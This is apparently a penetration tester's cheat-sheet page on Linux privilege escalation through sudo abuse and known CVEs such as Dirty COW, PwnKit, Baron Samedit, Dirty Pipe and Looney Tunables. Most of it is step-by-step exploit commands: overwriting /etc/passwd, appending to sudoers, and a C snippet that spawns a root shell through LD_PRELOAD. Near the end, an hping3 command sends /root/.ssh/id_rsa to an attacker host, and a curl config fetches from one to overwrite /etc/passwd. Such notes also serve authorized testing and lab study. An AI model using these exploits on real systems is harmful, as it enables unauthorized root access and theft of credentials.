# Sudo exploitation & CVEs

{% embed url="https://book.hacktricks.xyz/linux-unix/linux-privilege-escalation-checklist#sudo-and-suid-commands" %}

{% embed url="https://www.hackingarticles.in/linux-privilege-escalation-using-exploiting-sudo-rights/" %}

{% hint style="info" %}
{% code overflow="wrap" %}
```bash
#if it has this it follows this PATH for sudo so we cannot exploit relative paths or binaries with no full paths
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
```
{% endcode %}
{% endhint %}

## Abusing Sudo

{% code overflow="wrap" fullWidth="true" %}
```bash
# If a command that should work with sudo fails, check /var/log/syslog | grep -i command
# To check AppArmor status
sudo aa-status
```
{% endcode %}

## SUDO KILLER / Sudo Abuse

[Linux Privilege Escalation through SUDO abuse](https://github.com/TH3xACE/SUDO_KILLER)

## asterisks (\*) in pwd - pwfeedback

You may have noticed, however, that when you enter your password you see asterisks. This is not default behaviour. There was a CVE released that affects this configuration. The setting is called pwdfeedback.

[https://github.com/saleemrashid/sudo-cve-2019-18634](https://github.com/saleemrashid/sudo-cve-2019-18634)

## CVEs

| [https://dylankatz.com/Analysis-of-CVE-2019-18634/](https://dylankatz.com/Analysis-of-CVE-2019-18634/) |
| ------------------------------------------------------------------------------------------------------ |
| [https://nvd.nist.gov/vuln/detail/CVE-2019-18634](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)     |
| [https://tryhackme.com/room/sudovulnsbof](https://tryhackme.com/room/sudovulnsbof)                     |

{% code overflow="wrap" fullWidth="true" %}
```sh
https://github.com/kkamagui/linux-kernel-exploits

# [CVE-2016-4557] double-fdput()  
https://bugs.chromium.org/p/project-zero/issues/detail?id=808
# [CVE-2021-3490] eBPF
https://github.com/chompie1337/Linux_LPE_eBPF_CVE-2021-3490

# Dirtyc0w
https://github.com/dirtycow/dirtycow.github.io/wiki/PoCs
ONCE A KERNEL VERSION SEEMS VULNERABLE, STRAT TRYING EVERY EXPLOIT ABOVE (TRIAL AND ERROR)
https://github.com/evait-security/ClickNRoot/blob/master/1/exploit.c
https://github.com/scumjr/dirtycow-vdso #custom dirtycow, try if common one fails
gcc -pthread dirty.c -o dirty -lcrypt
./dirty hola   // hola is the new password
# Then su (username)
# AFTER GETTING A SHELL VERY IMPORTANT!!!
echo 0 > /proc/sys/vm/dirty_writeback_centisecs
# -----------ANOTHER ONE, c0w
# c0w.c. It replaces the SUID file /usr/bin/passwd with one that spawns a shell (a backup of /usr/bin/passwd is made at /tmp/bak).
# Compile the code and run it (note that it may take several minutes to complete):
gcc -pthread /home/user/tools/kernel-exploits/dirtycow/c0w.c -o c0w 
# Execute the exploit
./c0w
# Once the exploit completes, run /usr/bin/passwd to gain a root shell:
/usr/bin/passwd
# Remember to restore the original /usr/bin/passwd file
mv /tmp/bak /usr/bin/passwd

# pkexec - pwnkit
https://github.com/Almorabea/pkexec-exploit
https://github.com/ly4k/PwnKit
```
{% endcode %}

## Wildcards

[https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/wildcards-spare-tricks)

[https://www.exploit-db.com/papers/33930](https://www.exploit-db.com/papers/33930)

### chown

`Symlink with group owner -> Original file with/without that group owner needs group write access`

If \* or 777 or similar high permissions are applied, see if we can use symlinks to alter other real files permissions that we can write or are run by root.

## chmod

chmod never changes the permissions of symbolic links; the chmod system call cannot change their permissions. This is not a problem since the permissions of symbolic links are never used. However, for each symbolic link listed on the command line, chmod changes the permissions of the pointed-to file.

## (ALL,!root)

CVE-2019-14287

[https://www.exploit-db.com/exploits/47502](https://www.exploit-db.com/exploits/47502)

```
Output = (ALL,!root) NOPASSWD: /bin/bash
```

## Baron Samedit (CVE-2021-3156)

Heap buffer overflow, affects any unpatched version of the sudo program from 1.8.2-1.8.31p2 and 1.9.0-1.9.5p1

{% code fullWidth="false" %}
```bash
# Check if vulnerable
sudoedit -s '\' $(python3 -c 'print("A"*1000)')
# If shows corruption, dump, aborted means it is vulnerable. If it is patched, it will show usage: sudoedit
https://github.com/blasty/CVE-2021-3156
make
# list targets:
./sudo-hax-me-a-sandwich
# run:
./sudo-hax-me-a-sandwich <target_number>

https://github.com/worawit/CVE-2021-3156
```
{% endcode %}

## Pwnkit (CVE-2021-4034)

{% code overflow="wrap" fullWidth="true" %}
```
It is an authentication system. It is vulnerable if pkexec binary is present and version is prior to the patch

https://github.com/ly4k/PwnKit/tree/main
https://github.com/arthepsy/CVE-2021-4034
https://github.com/berdav/CVE-2021-4034

Add to Pwnkit (berdav exploit) the fact we need make and pkexec binaries on the target.
Just clone repo, zip it, upload it to the target, unzip it, use make and run the exploit.

Mitigation -> upgrade the system, if not possible at least remove SUID bit from pkexec binary
System is patched if when the ./exploit is executed, the pkexec help is shown.
```
{% endcode %}

## Polkit (CVE-2021-3560)

Following distros, among others, are vulnerable:

* Red Hat Enterprise Linux 8
* Fedora 21 (or later)
* Debian Testing ("Bullseye")
* Ubuntu 20.04 LTS ("Focal Fossa"), last vulnerable version is `0.105-26ubuntu1`

{% code overflow="wrap" fullWidth="true" %}
```bash
https://github.com/secnigma/CVE-2021-3560-Polkit-Privilege-Esclation
# Manual explotation, first we need to know how long it will take the program to run (note real time)
time dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1
# Then interrupt the execution halfway, i.e. if real time was 11 ms use 5 ms
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts org.freedesktop.Accounts.CreateUser string:attacker string:"Pentester Account" int32:1 & sleep 0.005s; kill $!
# Then check if that user has sudo permissions and if so, it worked and we just need to add a hashed password for it
dbus-send --system --dest=org.freedesktop.Accounts --type=method_call --print-reply /org/freedesktop/Accounts/User1000 org.freedesktop.Accounts.User.SetPassword string:'HASHED_PWD' string:'Ask the pentester' & sleep 0.005s; kill $!
```
{% endcode %}

## Dirty Pipe (CVE-2022-0847)

[https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847](https://www.hackthebox.com/blog/Dirty-Pipe-Explained-CVE-2022-0847)

DirtyPipe is a local privilege escalation vulnerability in the Linux kernel that allows a local attacker to bypass any file permissions, and write arbitrary data to any file under certain conditions.

One of the major limitations of this exploit is that the user must at least have read permission over the file that he/she is targeting to overwrite, because the exploit makes use of the splice() system call. Another limitation of the exploit is that it can only modify after the first byte of the file through the end of the file. It cannot modify the first byte, or extend beyond the original file size.

Dirty Pipe has been fixed in Linux kernel versions 5.16.11, 5.15.25 and 5.10.102

{% code overflow="wrap" fullWidth="true" %}
```bash
https://dirtypipe.cm4all.com/
https://github.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit
https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/blob/main/exploit-2.c
# VERIFY IF VULNERABLE
https://github.com/basharkey/CVE-2022-0847-dirty-pipe-checker

# Take PoC from the website above. The overwritten file will be /etc/passwd and we just need the new account and the offset
# IMPORTANT: BACKUP /ETC/PASSWD BEFORE PROCEEDING, JUST IN CASE
# The offset will be the starting point to overwrite the /etc/passwd so some accounts will be messed up; games account is not relevant so it's a good option
grep -b "games" /etc/passwd
# Offset result will be a number, 189 for example. Then we need the user line which is sth like this:
'USERNAME:HASH:0:0::/root:/bin/bash'
# where hash is the hashed password
openssl passwd -6 --salt mysalt "Hola1234"
# Then we compile the exploit and run it. VERY IMPORTANT: LEAVE IT WITHOUT SINGLE QUOTE AND ADD IT TO THE NEXT LINE AS BELOW
gcc poc.c -o exploit
./exploit /etc/passwd $OFFSET_NUMBER 'USERNAME:HASH:0:0::/root:/bin/bash
> '
# Once we are root, we restore /etc/passwd
cp /tmp/passwd /etc/passwd

# Second exploit -> simpler, it should be run with a single argument specifying a target binary, owned by root and with the SUID bit set, for example:
https://haxx.in/files/dirtypipez.c
./exploit /bin/su
# Do not forget to clean up /tmp/sh as root
```
{% endcode %}

## Overlayfs (CVE-2021-3493, CVE-2023-0386)

{% code overflow="wrap" fullWidth="true" %}
```sh
mount | grep -i overlay # see if overlay is used, we should see overlay on /var/lib/docker/overlay.../merged
ls -l /var/lib/docker/overlay.../merged
# If previous command works -> we could access docker container from host -> we could set SUID bash on the container
# and run that file from the host to get root on the host
ls -l /var/lib/ | grep docker # to see if we can get into any folder on the host
```
{% endcode %}

## Dirty Sock (cve-2019-7304)

[https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html](https://0xdf.gitlab.io/2019/02/13/playing-with-dirty-sock.html)

## Looney Tunables (CVE-2023-4911)

[https://haxx.in/exploits/](https://haxx.in/exploits/)

[https://github.com/leesh3288/CVE-2023-4911](https://github.com/leesh3288/CVE-2023-4911)

Vulnerable versions: glibc 2.34 up to (excluding) glibc 2.39

Whenever you execute an ELF file that depends on shared libraries (`.so` files), the operating system will need to load such libraries and link them to your executable so that any shared functions are available to your program during its execution. In Linux systems, this is normally managed by `ld.so`, an executable prepackaged as part of the `glibc` library.

The exploit uses a trial-and-error approach to account for the randomness of the stack's location. It repeatedly runs the program (forking and executing it) until it gets lucky and the fixed address 0x7ffdfffff030 matches the address where the stack index points to ". This effectively manipulates the library search path to point to the directory named " which will contain a malicious version of lib6.so.

The process for generating the forged libc6.so consists of copying libc6.so but replacing the \_\_libc\_start\_main function with a custom shellcode that does setuid(0) + setgid(0) + exec('/bin/sh'). You can find the Python script for this here.

The program enters a loop where it forks a child process: In the child process, it attempts to execute /usr/bin/su with --help. If the child process takes longer than one second, it assumes that it is returning from a shell, indicating a potential successful exploit.

```bash
# First, you must execute the Python script to generate the malicious libc.so.6.
python3 gen_libc.py
# You will then need to compile the exploit using gcc:
gcc -o exp exp.c
# Finally, you can launch the exploit and be patient since the exploitation may take some time (5 to 20 mins).
./exp
```

## ImageTragic (ImageMagick version)

[https://github.com/vulhub/vulhub/blob/master/imagemagick/imagetragick/README.md](https://github.com/vulhub/vulhub/blob/master/imagemagick/imagetragick/README.md)

## Sudo tokens (Process Injection)

[https://github.com/nongiach/sudo\_inject](https://github.com/nongiach/sudo_inject)

## LD\_PRELOAD

{% code overflow="wrap" fullWidth="true" %}
```sh
https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/
LD_PRELOAD is a function that allows any program to use shared libraries. This blog post  will give you an idea about the capabilities of LD_PRELOAD. If the  "env_keep" option is enabled we can generate a shared library which will  be loaded and executed before the program is run. Please note the  LD_PRELOAD option will be ignored if the real user ID is different from  the effective user ID. 

The steps of this privilege escalation vector can be summarized as follows;
1. Check for LD_PRELOAD (with the env_keep option)
2. Write a simple C code compiled as a share object (.so extension) file
3. Run the program with sudo rights and the LD_PRELOAD option pointing to our .so file
The C code will simply spawn a root shell and can be written as follows;
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}

We can save this code as shell.c and compile it using gcc into a shared object file using the following parameters;
gcc -fPIC -shared -o shell.so shell.c -nostartfiles
We can now use this shared object file when launching any program our  user can run with sudo. In our case, Apache2, find, or almost any of  the programs we can run with sudo can be used. 
We need to run the program by specifying the LD_PRELOAD option, as follows;
sudo LD_PRELOAD=/home/user/ldpreload/shell.so find
This will result in a shell spawn with root privileges. 
```
{% endcode %}

## sudoers

[https://linux.die.net/man/5/sudoers\
https://roshanguragain.com.np/tryhackme/hackerofthehill\_easy-tryhackme/](https://linux.die.net/man/5/sudoershttps://roshanguragain.com.np/tryhackme/hackerofthehill_easy-tryhackme/)

{% code overflow="wrap" fullWidth="true" %}
```bash
# SETENV and NOSETENV 
These tags override the value of the setenv option on a per-command basis. Note that if SETENV has been set for a command, the user may disable the env_reset option from the command line via the -E option. Additionally, environment variables set on the command line are not subject to the restrictions imposed by env_check, env_delete, or env_keep. As such, only trusted users should be allowed to set variables in this manner. If the command matched is ALL, the SETENV tag is implied for that command; this default may be overridden by use of the NOSETENV tag.  
With SETENV I can change/set environmental variables such as PATH, PYTHONPATH...

if .bashrc has sth like this
enable -n [ # ]
# And there is a comparison [ -f /whatever/file ] on a script, we can hijack the session by creating a fake binary called [
# Taht works because the binary [ exists on the filesystem
└─$ ls -l /usr/bin/[
-rwxr-xr-x 1 root root 68496 Sep 20  2022 '/usr/bin/['
# Check man bash and look for SHELL BUILT-IN to see more info // also run "help enable" on Bash
# That means by enable -n disables those builtins so [ is no longer comparison but the [ binary, and since the path is not /usr/bin/[ it can be hijacked

[ is actually the same as test, and a program on the filesystem (this article https://www.educative.io/courses/master-the-bash-shell/392YWp2pOv4 shows more detail).


#Grant sudo privileges to a user for any command
echo $USER    ALL=(ALL:ALL) ALL >> /etc/sudoers

#Sudo for everyone
chmod +w /mnt/root/etc/sudoers
vi /mnt/root/etc/sudoers # edit your user to be "user ALL=(ALL:ALL) ALL"
chmod -w /mnt/root/etc/sudoers
exit
```
{% endcode %}

## systemctl status

```
systemd --version
https://nvd.nist.gov/vuln/detail/CVE-2023-26604
https://gtfobins.github.io/gtfobins/systemctl/
```

## apache2

```
sudo apache2 -f /etc/shadow
```

## curl&#x20;

<pre class="language-sh"><code class="lang-sh"><strong># Env variables
</strong><strong>curl http_proxy=http://$ATTACKING_IP:8080 http://URL/path/file
</strong># Intercept the request/response and modify them if necessary

# curl -K config file
└─$ curl --help all | grep -E '\-K|-o,' 
 -K, --config &#x3C;file>                               Read config from a file
 -o, --output &#x3C;file>                               Write to file instead of stdout
 
$ curl -K file

$ cat file 
url = "http://$ATTACKING_IP/passwd"
output = "/etc/passwd"
</code></pre>

## rsync

Research all parameters on help/man, for example --chown changes the owner of the copied files.

## pip3 download

{% code overflow="wrap" fullWidth="true" %}
```
how could the following sudo command be exploited? "NOPASSWD: /usr/bin/pip3 download http://127.0.0.1:3000/*.tar.gz"

Command injection: If the input for the download URL is not properly validated, an attacker can inject additional commands or exploit vulnerabilities in the download functionality. This could lead to arbitrary code execution on the system.

Malicious package: If the downloaded package is not validated or originates from an untrusted source, an attacker could create a malicious package that executes arbitrary code during installation. This could potentially lead to a privilege escalation or compromise of the system.

To mitigate these risks, it is crucial to ensure proper validation and sanitization of input, implement strict access controls, validate downloaded packages, and review and restrict the usage of the "NOPASSWD" directive in the sudoers file.
```
{% endcode %}

## adduser

```
sudo adduser myuser --gid 0
sudo adduser --ingroup root myuser
sudo adduser --no-create-home --ingroup sudo myuser
```

## hping3

{% code overflow="wrap" %}
```bash
https://iphelix.medium.com/hping-tips-and-tricks-85698751179f

# Listener on attacking machine
sudo hping3 --icmp $VICTIM_IP --listen signature --safe (-I eth0)
# Now the victim will send the file
sudo hping3 --icmp $ATTACKER_IP -e signature -E /root/.ssh/id_rsa -d 2000
# If file is cut/screwed while transferring, create two SSH sessions/revshells and transfer from 1 to 2 using localhost
```
{% endcode %}
